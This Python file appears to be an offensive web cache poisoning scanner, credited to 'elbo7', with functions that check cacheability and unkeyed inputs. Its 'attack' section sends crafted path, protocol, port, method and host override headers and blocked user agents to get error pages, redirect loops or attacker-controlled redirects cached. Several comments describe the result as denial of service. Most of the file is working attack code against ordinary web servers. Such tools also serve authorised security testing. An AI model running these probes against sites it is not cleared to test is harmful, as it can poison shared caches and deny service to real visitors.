import httpx
import random
import string
import timeit
import time
import logging
import termcolor

#
# Global variables
#
hit_values = ["HIT", "Hit", "hit"]
miss_values = ["MISS", "Miss", "miss"]

#
# Display Banner
#
def print_banner():
    print(termcolor.colored("               _______ _____  _______ __   __  ______                        ", "blue"))
    print(termcolor.colored("              /  ____/  _   |/  ____/|  | |  |/ _____\\                      ", "blue"))
    print(termcolor.colored("             /  /   /  / |  /  /     |  |_|  / /______|                      ", "blue"))
    print(termcolor.colored("             \\  \\___\\  \\_|  \\  \\___  |   _   \\ \\______      ", "blue"), termcolor.colored("________ ", "green"), sep='')
    print(termcolor.colored("              \\", "blue"), termcolor.colored("_____", "green"), termcolor.colored("\\\\", "blue"), termcolor.colored("__", "green"), termcolor.colored(" |", "blue"), termcolor.colored("__", "green"), termcolor.colored("|\\", "blue"), termcolor.colored("_____", "green"), termcolor.colored("\\ |", "blue"), termcolor.colored("__", "green"), termcolor.colored("|", "blue"), termcolor.colored("_", "green"), termcolor.colored("|", "blue"), termcolor.colored("__", "green"), termcolor.colored("|\\", "blue"), termcolor.colored("______", "green"), termcolor.colored("/", "blue"), termcolor.colored("_____/    \\O  \\", "green"), sep='')
    print(termcolor.colored("              /  __", "green"), termcolor.colored("/ |", "blue"), termcolor.colored("__", "green"), termcolor.colored("/ /  _   || |", "blue"), termcolor.colored("_", "green"), termcolor.colored("/ // _____\\", "blue"), termcolor.colored("__________        : |", "green"), termcolor.colored("====< ", "red"), sep='')
    print(termcolor.colored("             /  /", "green"), termcolor.colored(" /  | / /  / |  || |/ // /______|         ", "blue"), termcolor.colored("\\____/O__/       ", "green"), sep='')
    print(termcolor.colored("             \\  \\", "green"), termcolor.colored("/ /||/ /\\  \\_|  || |\\ \\\\ \\______                    ", "blue"), sep='')
    print(termcolor.colored("    _________/  /", "green"), termcolor.colored("_/ |__/  \\__ |__||_| \\_\\\\______/                        ", "blue"), sep='')
    print(termcolor.colored("ooo", "yellow"), termcolor.colored("(___________/                                                             ", "green"), sep='')
    print("\n")
    print(termcolor.colored("                    Created by elbo7. Version 1.0\n\n", "green"))


#
# random string generators
#
def gen_rand_str(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
def gen_rand_int(length):
    return ''.join(random.choice(string.digits) for i in range(length))

#
# Check if specified endpoint is cacheable through hit/miss, age header and timing.
# Output can be true or false, or in case  of full data will return a tuple with 
# result conclusion as the first element. Function can be optimised for speed through
# skip_timing=True or by lowering the timing_sample, and double_request=False or by lowering
# double_request_sleep. However this may harm detection rate and/or cause false positives
# Default settings are optimal for detection and speed.
# Returns true/false, or a tuple: (is_cacheable, cache_headers_detected, cache_header_list, age_header_detected, time_diff_detected)
#
def is_cacheable(url, full_data=False, force_timing=False, skip_timing=False, timing_sample=15, timing_threshold=1.2, double_request=True, double_request_sleep=1):
    logging.info(termcolor.colored("[i]: Checking cacheability of {0}".format(url), "blue"))

    hit_or_miss_detected = False
    hit_or_miss_headers = []
    age_header_detected = False
    time_diff_detected = False

    with httpx.Client() as http_client:
        # request the url twice because the age header sometimes
        # does not appear on the first request, but on subsequent ones
        response = http_client.get(url)
        if(double_request):
            time.sleep(double_request_sleep)
            response = http_client.get(url)
        
        if response.status_code not in [200,301,302]:
            logging.warning(termcolor.colored("[?]: Server did not respond with 200 OK or a redirect.", "yellow"))
        

        for header in response.headers.items():
            if header[0] == "age" and header[1].isnumeric():
                age_header_detected = True
                logging.info(termcolor.colored("[i]: Age header detected: \"{0}: {1}\"".format(header[0], header[1]), "blue"))

            for hit_or_miss in (hit_values + miss_values):
                if hit_or_miss in header[1]:
                    hit_or_miss_detected = True
                    hit_or_miss_headers.append(header[0])
                    logging.info(termcolor.colored("[i]: Cache HIT/MISS detected: \"{0}: {1}\"".format(header[0], header[1]),"blue"))
                    break
        
        # if we detect headers, and we dont explicitly specify
        # we want timing, we return immediately instead of testing timing.
        if (hit_or_miss_detected or age_header_detected) and not force_timing:
            if full_data:
                return (True, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return True

        if not skip_timing:
            # we did not detect cache headers/explicitly asked for timing, try timing responses.
            avg_response_time_cachebusted = 0
            avg_response_time_cacheintact = 0

            rand_str = gen_rand_str(5)

            for i in range(timing_sample):
                # Timing supposedly non-cached responses
                start_time = timeit.default_timer()
                http_client.get(url, params={rand_str+"-cache": i}, headers={"origin": "abc.com"+str(i)})
                avg_response_time_cachebusted += timeit.default_timer() - start_time

                # Timing supposedly cached responses
                start_time = timeit.default_timer()
                http_client.get(url, params={rand_str+"-cache": 0}, headers={"origin": "abc.com"})
                avg_response_time_cacheintact += timeit.default_timer() - start_time

            avg_response_time_cachebusted /= timing_sample
            avg_response_time_cacheintact /= timing_sample

            if (avg_response_time_cachebusted / avg_response_time_cacheintact) > timing_threshold:
                time_diff_detected = True
                logging.info(termcolor.colored("[i]: Response time proportion of {0:.2f} (> threshold={1}) detected.".format((avg_response_time_cachebusted / avg_response_time_cacheintact), timing_threshold), "blue"))

        # finally, we return the results of the tests
        if hit_or_miss_detected or age_header_detected or time_diff_detected:
            if full_data:
                return (True, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return True
        else:
            if full_data:
                return (False, hit_or_miss_detected, hit_or_miss_headers, age_header_detected, time_diff_detected)
            else:
                return False


#
# Helper function to check if the provided response 
# is cached or not Based on cacheability data provided
# Some cache headers never change, i.e. stay always miss/hit
# to avoid that problem, specify a cache header you know for
# sure changes.
#
def is_page_cached(http_response, dynamic_cache_headers, use_age_header):
    page_is_cached = False

    # Check if we have dynamic cache headers, then 
    # check if any of them are in the response, then
    # check if any of them contain the word 'HIT',
    # if all these checks pass, return true.
    if len(dynamic_cache_headers) > 0:
        intersection_headers = [i for i in dynamic_cache_headers if i in http_response.headers]
        for header in intersection_headers:
            if any(hit in http_response.headers[header] for hit in hit_values):
                page_is_cached = True
    
    # if the age header is 0 or non-existent, the page is not cached
    if use_age_header:
        if "age" in http_response.headers:
            if int(http_response.headers["age"]) > 0:
                page_is_cached = True

    return page_is_cached


#
# Helper function to check which cache-headers change
# when getting cached responses vs uncached responses
# some servers have multiple caches, some of which 
# always provide a hit/miss, usually backend ones,
# this is to determine which headers are useful.
# some headers also simply contain the substrings
# "hit" or "miss" in their values, e.g. "X-Example: MISSing"
# this function filters them out
#
def get_dynamic_headers(cached_response, uncached_response, cache_headers):
    if len(cache_headers) > 0:
        # this says only include cache headers which are both present in the cached and uncached response
        # TODO: make sure that some caches dont simply indicate a hit/miss by omitting a header, for example,
        # maybe some caches only put in a header if a miss happened, but omit it if it's a cache hit, or vice-versa
        intersection_headers = [i for i in cache_headers if (i in cached_response.headers) and (i in uncached_response.headers)]
        # this is a really long way to say only include headers which have
        # a hit value in the cached response and a miss value in the uncached one
        dynamic_cache_headers = [header for header in intersection_headers if (any(hit_value in cached_response.headers[header] for hit_value in hit_values) and any(miss_value in cached_response.headers[header] for miss_value in miss_values))]
        return dynamic_cache_headers
    return []


#
# Check for if inputs are unkeyed, test specific/arbitrary 
# url parameters, host header and origin header and specified
# headers (in dictionary format "header-name": "value")
# Returns a tuple, (are_arbitrary_params_unkeyed, specified_unkeyed_params=[], unkeyed_headers=[])
#
def get_unkeyed_input(url, is_cacheable_data, test_params=[], test_headers={}):
    logging.info(termcolor.colored("[i]: Checking for unkeyed parameters on {0}".format(url), "blue"))

    if not is_cacheable_data[0]:
        return (-1, [], [])

    arbitrary_params_unkeyed = False
    specified_unkeyed_params = []
    unkeyed_headers = []

    with httpx.Client() as http_client:
        # Try to make sure the response is cached first
        response = http_client.get(url)
        time.sleep(1)
        response = http_client.get(url)
        
        if response.status_code not in [200,301,302]:
            logging.warning(termcolor.colored("[?]: Server did not respond with 200 OK or a redirect.", "yellow"))
        
        # Check cacheability of arbitrary params
        rand_param = gen_rand_str(5)+"-cache"
        test_response = http_client.get(url, params={rand_param: 1337})

        dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
        if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]):
            logging.info(termcolor.colored("[i]: Arbitrary parameters are unkeyed.", "blue"))
            arbitrary_params_unkeyed = True
        else:
            logging.info(termcolor.colored("[i]: Arbitrary parameters are keyed.", "blue"))

        # Check cacheability of specified params
        for test_param in test_params:
            test_response = http_client.get(url, params={test_param: gen_rand_str(8)})

            dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
            if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]):
                logging.info(termcolor.colored("[i]: \"{0}\" parameter is unkeyed.".format(test_param), "blue"))
                specified_unkeyed_params.append(test_param)
            else:
                logging.info(termcolor.colored("[i]: \"{0}\" parameter is keyed.".format(test_param), "blue"))
        
        # Make sure it's cached again
        response = http_client.get(url)
        time.sleep(1)
        response = http_client.get(url)

        # Check cacheability of specified headers
        for test_header in test_headers.items():
            test_response = httpx.get(url, headers={test_header[0]: test_header[1]+gen_rand_int(4)})

            dynamic_header_list = get_dynamic_headers(response, test_response, is_cacheable_data[2])
            if is_page_cached(test_response, dynamic_header_list, is_cacheable_data[3]) and response.status_code == test_response.status_code:
                logging.info(termcolor.colored("[i]: \"{0}\" header is unkeyed.".format(test_header[0]), "blue"))
                unkeyed_headers.append(test_header[0])
            else:
                logging.info(termcolor.colored("[i]: \"{0}\" header is keyed.".format(test_header[0]), "blue"))
        
    return (arbitrary_params_unkeyed, specified_unkeyed_params, unkeyed_headers)



##################################
### SPECIFIC ATTACK TECHNIQUES ###
##################################

#
# tries to override the path and get the page cached, essentially denying service to the specified page.
# returns a tuple containing if the attack succeeds, and the exploitable headers.
#
def attack_path_override(url):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/path-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"/404" + gen_rand_str(16)})
        #if we get a non 200 response code, we remove the header and resend the request
        if response.status_code != 200:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# tries to make it look like the request is done through http when in fact it's done through https, causing the server to 
# cache a redirect 301/302 response, which causes an infinite loop of redirects or an error page, essentially DoS.
#
def attack_protocol_override(url):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/protocol-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"http"})
        #if we get a non 200 response code, we remove the header and resend the request
        if response.status_code != 200:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Does the same thing as protocol override, makes the server think it's requesting port 80 which would
# return a 301/302 redirect to port 443, if cached causes infinite redirect loop, essentially DoS.
#
def attack_port_override(url):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/port-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"80"})
        #if we get a non 200 response code, we remove the header and resend the request
        if response.status_code != 200:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Does the same thing as protocol override, makes the server think it's requesting port 80 which would
# return a 301/302 redirect to port 443, if cached causes infinite redirect loop, essentially DoS.
#
def attack_method_override(url):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/method-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"HEAD"})
        #if we get an empty response, we remove the header and resend the request
        if len(response.text) <= 2:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if len(response.text) <= 2:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# This attack uses an injected host header to change the redirect location of a 30X status code
# can take an extra header and value to cause a redirect on an otherwise 200 ok page
#
def attack_permenant_redirect(url, redirect_causing_header="X-placeholder", redirect_causing_header_value="value"):
    exploitable_headers = []
    is_vulnerable = False

    #if the page does not return a 30X redirect there's nothing to do
    cache_buster = "cache-" + gen_rand_str(8)
    response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                        "accept":"*/*, text/" + cache_buster,
                                                                                        "origin":"https://" + cache_buster + ".example.com",
                                                                                        redirect_causing_header:redirect_causing_header_value})

    if response.status_code not in [301, 302, 303, 307, 308]:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/host-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            redirect_causing_header:redirect_causing_header_value,
                                                                                            header:"elbo7.com"})
        #if the location header contains our domain, we succeeded, test if cached or not
        if "location" in response.headers and "elbo7" in response.headers["location"]:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if "location" in response.headers and "elbo7" in response.headers["location"]:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

#
# Tries to induce a 403 by using a banned user agent
#
def attack_evil_user_agent(url):
    exploitable_values = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_values)
    
    values = open("lists/evil-user-agents.txt", "r").read().splitlines()

    for value in values:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":value,
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
        #if we get a 403, repeat to see if cached
        if response.status_code != 200:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if response.status_code != 200:
                exploitable_values.append(value)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_values)

def attack_host_override(url):
    exploitable_headers = []
    is_vulnerable = False
    
    #if the page does not return a 200 ok there's nothing to do
    response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                  "accept":"*/*, text/stuff",
                                                  "origin":"https://www.example.com"})
    if response.status_code != 200:
        return (is_vulnerable, exploitable_headers)
    
    headers = open("lists/host-override-headers.txt", "r").read().splitlines()

    for header in headers:
        #generate a cache buster and send the request with the header
        cache_buster = "cache-" + gen_rand_str(8)
        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com",
                                                                                            header:"www.elbo7.com"})
        #if we get a non 200 response code, we remove the header and resend the request
        if "elbo7" in response.text:
            time.sleep(1)
            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                            "accept":"*/*, text/" + cache_buster,
                                                                                            "origin":"https://" + cache_buster + ".example.com"})
            if "elbo7" in response.text:
                exploitable_headers.append(header)
                is_vulnerable = True
    
    return (is_vulnerable, exploitable_headers)

logging.basicConfig(level=logging.INFO)
print_banner()
